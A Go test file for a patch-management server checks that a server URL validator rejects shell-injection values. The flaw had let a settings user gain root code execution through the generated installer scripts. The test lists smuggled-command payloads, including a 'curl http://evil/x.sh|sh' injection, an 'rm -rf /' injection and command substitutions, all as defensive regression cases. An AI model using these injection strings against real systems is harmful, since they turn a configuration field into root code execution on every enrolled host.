package handler

import (
	"strings"
	"testing"
)

// TestValidateServerURL_RejectsShellInjection is the regression guard for the
// settings-to-root-code-execution path.
//
// server_url was persisted with no validation and then embedded verbatim in a
// double-quoted shell assignment in the generated installer and auto-enrolment
// scripts (export PATCHMON_URL="<value>"), which are documented to be piped
// into sh as root on every new host. A can_manage_settings user could therefore
// turn a settings write into fleet-wide root code execution.
func TestValidateServerURL_RejectsShellInjection(t *testing.T) {
	t.Parallel()

	hostile := []string{
		`http://x";curl -s http://evil/x.sh|sh;#`, // the reported payload
		`http://x"; rm -rf / ;"`,
		"http://x`id`",
		`http://x$(id)`,
		`http://x${IFS}evil`,
		`http://x\"evil`,
		"http://x\nexport EVIL=1",
		"http://x\r\nexport EVIL=1",
		`http://x'evil'`,
		"http://x evil",
		`http://x&&evil`,
		`http://x|evil`,
		`http://x;evil`,
		`http://x>out`,
		`http://x<in`,
		`http://x*`,
		`http://x?evil=1&y=2`, // query strings are not needed for a base URL
	}
	for _, raw := range hostile {
		if err := validateServerURL(raw); err == nil {
			t.Errorf("server URL %q must be rejected", raw)
		}
	}
}

// TestValidateServerURL_RejectsBadSchemes keeps non-http(s) URLs out.
func TestValidateServerURL_RejectsBadSchemes(t *testing.T) {
	t.Parallel()

	for _, raw := range []string{
		"ftp://patchmon.example.com",
		"file:///etc/passwd",
		"javascript:alert(1)",
		"patchmon.example.com", // no scheme
		"//patchmon.example.com",
		"https://", // no host
	} {
		if err := validateServerURL(raw); err == nil {
			t.Errorf("server URL %q must be rejected", raw)
		}
	}
}

// TestValidateServerURL_AcceptsRealURLs guards against over-rejecting.
func TestValidateServerURL_AcceptsRealURLs(t *testing.T) {
	t.Parallel()

	for _, raw := range []string{
		"https://patchmon.example.com",
		"http://patchmon.example.com",
		"https://patchmon.example.com:8443",
		"https://patchmon.example.com:8443/patchmon",
		"http://192.168.1.10:3001",
		"https://patch-mon.internal.example.co.uk",
		"http://localhost:3001",
		"https://[2001:db8::1]:8443",
		"", // clearing the value is allowed; the derive path or existing value applies
	} {
		if err := validateServerURL(raw); err != nil {
			t.Errorf("server URL %q must be accepted, got %v", raw, err)
		}
	}
}

// TestValidateServerURL_RejectsOverlongInput bounds what reaches the script.
func TestValidateServerURL_RejectsOverlongInput(t *testing.T) {
	t.Parallel()

	if err := validateServerURL("https://" + strings.Repeat("a", 4096) + ".com"); err == nil {
		t.Error("an overlong server URL must be rejected")
	}
}

// TestValidateServerURLParts covers protocol/host/port, which feed
// constructServerURL and reach the same scripts.
func TestValidateServerURLParts(t *testing.T) {
	t.Parallel()

	// Hostile hosts.
	for _, host := range []string{
		`x";curl evil|sh;#`,
		"x`id`",
		"x$(id)",
		"x evil",
		"x;evil",
		"x|evil",
		"x/../y",
		"",
	} {
		if err := validateServerURLParts("https", host, 443, false, true, false); err == nil {
			t.Errorf("server host %q must be rejected", host)
		}
	}

	// Hostile or wrong protocols.
	for _, proto := range []string{"ftp", "file", `https";evil`, "gopher", ""} {
		if err := validateServerURLParts(proto, "example.com", 443, true, false, false); err == nil {
			t.Errorf("server protocol %q must be rejected", proto)
		}
	}

	// Out-of-range ports.
	for _, port := range []int{0, -1, 65536, 999999} {
		if err := validateServerURLParts("https", "example.com", port, false, false, true); err == nil {
			t.Errorf("server port %d must be rejected", port)
		}
	}

	// Valid combinations.
	for _, tc := range []struct {
		proto string
		host  string
		port  int
	}{
		{"https", "patchmon.example.com", 443},
		{"http", "192.168.1.10", 3001},
		{"HTTPS", "patch-mon.example.co.uk", 8443},
		{"https", "[2001:db8::1]", 8443},
	} {
		if err := validateServerURLParts(tc.proto, tc.host, tc.port, true, true, true); err != nil {
			t.Errorf("%s://%s:%d must be accepted, got %v", tc.proto, tc.host, tc.port, err)
		}
	}
}

// TestConstructServerURL_OutputStaysSafe closes the loop: whatever the
// validated parts are, the derived URL must itself pass validation, since that
// is the value the scripts embed.
func TestConstructServerURL_OutputStaysSafe(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		proto string
		host  string
		port  int
	}{
		{"https", "patchmon.example.com", 443},
		{"http", "patchmon.example.com", 80},
		{"https", "patchmon.example.com", 8443},
		{"http", "192.168.1.10", 3001},
		{"https", "[2001:db8::1]", 8443},
	} {
		got := constructServerURL(tc.proto, tc.host, tc.port)
		if err := validateServerURL(got); err != nil {
			t.Errorf("constructServerURL(%q,%q,%d) = %q which fails validation: %v",
				tc.proto, tc.host, tc.port, got, err)
		}
	}
}
